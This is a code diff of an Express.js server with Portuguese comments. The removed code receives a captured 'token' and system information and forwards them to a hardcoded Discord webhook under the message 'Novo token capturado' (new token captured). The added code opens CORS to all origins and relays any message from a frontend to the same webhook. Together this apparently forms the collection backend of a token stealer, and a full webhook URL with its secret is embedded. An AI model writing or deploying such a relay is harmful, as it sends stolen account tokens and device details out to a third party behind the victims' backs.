@@ -1,52 +1,33 @@
 const express = require('express');
 const fetch = require('node-fetch');
+const cors = require('cors');  // Importando a biblioteca CORS
 const app = express();
+
+// Habilitando CORS para aceitar requisições de qualquer origem (backend no Render)
+app.use(cors());  // Permitir requisições de qualquer domínio
 
 app.use(express.json());
 
-app.post('/send-data', async (req, res) => {
-    const { token, systemInfo } = req.body;
-    
-    if (!token) {
-        return res.status(400).send('Token ausente');
-    }
+// Endpoint para enviar a mensagem para o Discord
+app.post('/send-to-discord', async (req, res) => {
+  const { message } = req.body;
 
-    try {
-        // Enviar dados para o webhook do Discord
-        const webhookUrl = 'https://discord.com/api/webhooks/1366557827107393608/ziqyGd8ZjfT3llWnKeNXIsDnFQr6XhkqLy-7ASQk7WCL2gMN3IAIe6sx4m0XWm_j5NcX';
-        const message = {
-            content: `Novo token capturado: ${token}`,
-            embeds: [
-                {
-                    title: 'Informações do Sistema',
-                    fields: [
-                        { name: 'Plataforma', value: systemInfo.platform },
-                        { name: 'User-Agent', value: systemInfo.userAgent }
-                    ]
-                }
-            ]
-        };
+  if (!message) return res.status(400).send("Mensagem ausente.");
 
-        const response = await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(message)
-        });
+  try {
+    // Substitua com sua URL do Webhook
+    await fetch('https://discordapp.com/api/webhooks/1366557827107393608/ziqyGd8ZjfT3llWnKeNXIsDnFQr6XhkqLy-7ASQk7WCL2gMN3IAIe6sx4m0XWm_j5NcX', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: message })  // Envia a mensagem capturada do frontend
+    });
 
-        if (response.ok) {
-            res.send('Dados enviados para o Discord');
-        } else {
-            res.status(500).send('Erro ao enviar dados para o Discord');
-        }
-    } catch (error) {
-        console.error('Erro ao enviar dados:', error);
-        res.status(500).send('Erro no servidor');
-    }
+    res.sendStatus(200);  // Retorna 200 OK se sucesso
+  } catch (error) {
+    console.error("Erro ao enviar para o Discord:", error);
+    res.sendStatus(500);  // Retorna 500 caso haja erro
+  }
 });
 
-const port = process.env.PORT || 3000;
-app.listen(port, () => {
-    console.log(`Servidor rodando na porta ${port}`);
-});
+// Defina a porta onde o servidor ficará escutando
+app.listen(3000, () => console.log("Servidor rodando em http://localhost:3000"));
